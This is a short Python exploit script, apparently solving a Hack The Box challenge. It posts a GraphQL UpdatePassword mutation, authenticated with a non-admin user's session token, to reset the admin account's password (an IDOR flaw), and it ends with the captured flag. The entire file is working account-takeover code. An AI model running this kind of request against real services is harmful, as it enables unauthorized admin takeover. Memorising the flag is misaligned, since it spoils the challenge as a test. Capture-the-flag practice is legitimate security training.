import requests

ip = "209.97.134.50:31657"
url = f"http://{ip}/graphql"

cookies = {
    "session" :"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpc19hZG1pbiI6MCwiaWF0IjoxNjc5MzMyNTIxfQ.av8j9HDemQH704gwaU7JoouZUDUbnGF3TPbPiEJuJWk"
}
data = {
    # "query":"mutation($recType: String!, $recAddr: String!, $recUser: String!, $recPass: String!, $recNote: String!) { AddPhrase(recType: $recType, recAddr: $recAddr, recUser: $recUser, recPass: $recPass, recNote: $recNote) { message } }",
    "query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }",
    "variables":{
        "username":"admin",
        "password":"test",
    }
}
# __schema{types{name,fields{name}}}
res = requests.post(url,json=data,cookies=cookies)
print (res.text)

# change admin password, then login admin:test
# HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}